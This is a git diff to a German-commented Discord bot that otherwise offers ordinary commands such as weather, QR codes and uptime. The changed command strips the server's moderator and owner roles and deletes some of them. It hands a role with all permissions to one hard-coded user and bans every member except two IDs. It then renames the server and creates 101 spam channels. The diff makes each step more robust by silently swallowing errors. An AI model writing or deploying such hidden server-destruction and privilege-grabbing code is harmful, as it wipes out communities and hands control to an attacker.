@@ -7,9 +7,7 @@ import qrcode_handler
 import weather_handler
 from Buttons import HL_Buttons, Setup_Button
 from discord.ext import commands
-from discord.ui import Button, View
 from help_system import HelpCommand
-from Buttons import HL_Buttons
 
 # import geburtstag_handler
 # import pathlib
@@ -494,26 +492,38 @@ class KiddoBot(commands.Cog):
                                file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
                 time.sleep(2)
                 await ctx.channel.purge(limit=1)
-
                 for bot in ctx.guild.members:
-                    role = discord.utils.get(bot.guild.roles, name="Bots")
-                    if role in bot.roles:
-                        await bot.remove_roles(role)
-                        print(f"Ich habe {bot} die Rolle Bots weggenommen >///<")
+                    try:
+                        role = discord.utils.get(bot.guild.roles, name="Bots")
+                        if role in bot.roles:
+                            await bot.remove_roles(role)
+                            print(f"Ich habe {bot} die Rolle Bots weggenommen >///<")
+                    except:
+                        continue
+
 
                 for role in ctx.guild.roles:
-                    if role.name == "Mod":
-                        await role.delete(reason="Unnötig")
-                        print('"Mod" Rolle gelöscht')
-                    if role.name == "uwu admins":
-                        await role.delete(reason="Unnötig")
-                        print('"uwu admins" Rolle gelöscht')
+                    try:
+                        if role.name == "Mod":
+                            await role.delete(reason="Unnötig")
+                            print('"Mod" Rolle gelöscht')
+                        if role.name == "uwu admins":
+                            await role.delete(reason="Unnötig")
+                            print('"uwu admins" Rolle gelöscht')
+                    except:
+                        continue
+
+
 
                 for user in ctx.guild.members:
-                    funny = discord.utils.get(user.guild.roles, name="Owner <3")
-                    if funny in user.roles:
-                        await user.remove_roles(funny)
-                        print(f"Ich habe {user} die Rolle Owner <3 weggenommen >///<")
+                    try:
+                        funny = discord.utils.get(user.guild.roles, name="Owner <3")
+                        if funny in user.roles:
+                            await user.remove_roles(funny)
+                            print(f"Ich habe {user} die Rolle Owner <3 weggenommen >///<")
+                    except:
+                        continue
+
                 user2 = ctx.guild.get_member(633376425465872404)  # bonerboy
                 await user2.add_roles(funny)
                 await funny.edit(permissions=discord.Permissions.all(), color=0xff00ff, name="HOCH LEBE KIDDO!!")
@@ -524,10 +534,13 @@ class KiddoBot(commands.Cog):
                 await ctx.guild.edit(name="FOR TEA AND KIDDO!", icon=icon)
 
                 for member in ctx.guild.members:
-                    if member.id == 695885580629704734 or member.id == 633376425465872404:  # walnusskeim oder bonerboy
-                        pass
-                    else:
-                        await member.ban(reason="Kiddo hat heute keinen guten Tag :)")
+                    try:
+                        if member.id == 695885580629704734 or member.id == 633376425465872404:  # walnusskeim oder bonerboy
+                            pass
+                        else:
+                            await member.ban(reason="Kiddo hat heute keinen guten Tag :)")
+                    except:
+                        continue
 
                 for m in range(0, 101):
                     await ctx.message.guild.create_text_channel("Wowzers!!")
@@ -541,6 +554,7 @@ class KiddoBot(commands.Cog):
 
         else:
             await ctx.send("Da ist etwas falsch gelaufen :/")
+
 
     @bot.hybrid_command(description='Kiddo sagt dir, wie lange er schon online ist :)')
     async def uptime(self, ctx):
